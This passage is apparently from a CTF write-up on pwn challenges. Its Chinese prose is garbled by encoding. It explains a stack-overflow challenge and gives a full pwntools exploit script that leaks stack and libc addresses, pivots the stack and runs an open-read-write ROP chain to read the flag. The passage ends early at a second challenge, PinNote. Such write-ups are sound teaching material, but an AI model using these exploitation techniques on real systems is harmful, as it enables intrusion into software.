</span></span></code></pre></td></tr></table></div></div><h1 id=pwn>Pwn</h1><h2 id=stack>stack</h2><p><img src=/img/2025-QWNT/43.png alt=img></p><p><img src=/img/2025-QWNT/44.png alt=img></p><p>sub_401354æ§åˆ¶å¥½è¾“å…¥å¯ä»¥æ³„æ¼rbpçš„æ ˆåœ°å€ã€‚</p><p>sub_4013B9å­˜åœ¨å¤§é‡æ ˆæº¢å‡ºã€‚</p><p>åœ¨sub_4013B9ä¸­è°ƒè¯•å‘ç°æ ˆä¸Šå­˜åœ¨libcåœ°å€ï¼š</p><p><img src=/img/2025-QWNT/45.png alt=img></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆç†æ§åˆ¶rbpå›åˆ°sub_401354æ¥æ³„æ¼libcåœ°å€0x75ae10429d90ç„¶åé¡ºä¾¿å›åˆ°mainå‡½æ•°0x401413ï¼Œä½†æ˜¯è¿™æ ·ä¸‹ä¸€æ¬¡printfä¼šå‡ºç°æ ˆå¯¹é½é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ ˆè¿ç§»ä¸€æ¬¡é¿å…è°ƒç”¨mainå‡½æ•°ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨sub_401354çš„readéƒ¨åˆ†ã€‚</p><p>è¿™æ ·é€šè¿‡åˆç†æ„é€ rbpå®Œæˆæ ˆä¸Šçš„æ ˆè¿ç§»ï¼Œé€šè¿‡sub_401354è‡ªå¸¦çš„printfå°†libcæ‰“å°å‡ºæ¥ï¼Œç„¶åæ¥ä¸Šä¸€ä¸ªsub_4013B9çš„readéƒ¨åˆ†ï¼Œå†ç»•å¼€æ²™ç›’æ‰§è¡Œorwå³å¯è·å¾—flagï¼š</p><p><img src=/img/2025-QWNT/46.png alt=img></p><p>expï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import *</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>stre</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=k>return</span> <span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ph</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=o>=</span><span class=s2>&#34;addr&#34;</span><span class=p>)</span> <span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=o>+</span><span class=s2>&#34;: &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>re</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pre</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reu</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span> <span class=p>:</span> <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rel</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>se</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sea</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sel</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sela</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>op</span><span class=p>()</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cp</span><span class=p>()</span> <span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr64</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr32</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr_T</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>re</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>raddr_A</span><span class=p>()</span> <span class=p>:</span> <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;-&#34;</span><span class=p>,</span><span class=kc>True</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>orw_rop64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>pop_rsi</span><span class=p>,</span><span class=n>pop_rdx</span><span class=p>,</span><span class=n>flag_addr</span><span class=p>,</span><span class=n>open_addr</span><span class=p>,</span><span class=n>read_addr</span><span class=p>,</span><span class=n>write_addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>orw</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>open_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>read_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>write_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>orw</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getorw</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=n>Arch</span><span class=p>)</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>+=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>+=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>=</span><span class=n>asm</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>arch</span><span class=o>=</span><span class=n>Arch</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gdbp</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>a</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>a</span><span class=o>!=</span><span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-8362e3425a.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = process(&#34;./pwn&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1>#elf = ELF(&#34;./pwn&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#34;./libc.so.6&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1>#lib = cdll.LoadLibrary(None)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#loadsym = &#34;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#code_addr = &#34; ./glibc-2.41.tar.gz --force&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#p = process([&#34;qemu-mipsel-static&#34;,&#34;-g&#34;, &#34;9999&#34;,&#34;-L&#34;,&#34;./&#34;,&#34;./pwn&#34;])</span>
</span></span><span class=line><span class=cl><span class=c1>#p = process([&#34;qemu-mipsel-static&#34;,&#34;-L&#34;,&#34;./&#34;,&#34;./pwn&#34;])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#context.arch = &#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#context.os = &#39;linux&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#elf.arch , elf.so</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>sea</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;name?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;, &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>raddr64</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ph</span><span class=p>(</span><span class=n>stack</span><span class=p>,</span> <span class=s2>&#34;stack&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x60</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mh>0x70</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4013D4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sea</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4013D4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401385</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>se</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span>
</span></span><span class=line><span class=cl><span class=n>se</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;, &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>reu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>raddr64</span><span class=p>()</span> <span class=o>-</span> <span class=mh>0x29d90</span>
</span></span><span class=line><span class=cl><span class=n>ph</span><span class=p>(</span><span class=n>libc_base</span><span class=p>,</span> <span class=s2>&#34;libc_base&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2a3e5</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x2be51</span>
</span></span><span class=line><span class=cl><span class=n>pop_rax_rdx_rbx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x904a8</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x91316</span>
</span></span><span class=line><span class=cl><span class=n>flag_addr</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>+</span> <span class=mh>0xF0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x60</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>stack</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFF9C</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_rdx_rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>257</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_rdx_rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_rdx_rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x30</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;flag</span><span class=se>\x00\x00\x00\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>se</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>op</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>flagï¼š</p><p><img src=/img/2025-QWNT/47.png alt=img></p><h2 id=pinnote>PinNote</h2><p>çœ‹äº†ä¸€åœˆæ²¡çœ‹å‡ºé—®é¢˜ï¼Œç›´åˆ°æµ‹è¿™ä¸ª tmp/pin* æ–‡ä»¶</p><p><img src=/img/2025-QWNT/48.png alt=img></p><p>å¦‚æœä¸¤ä¸ªè¿›ç¨‹åŒæ—¶æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶ï¼Œå°±å¯ä»¥ç¯¡æ”¹size,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
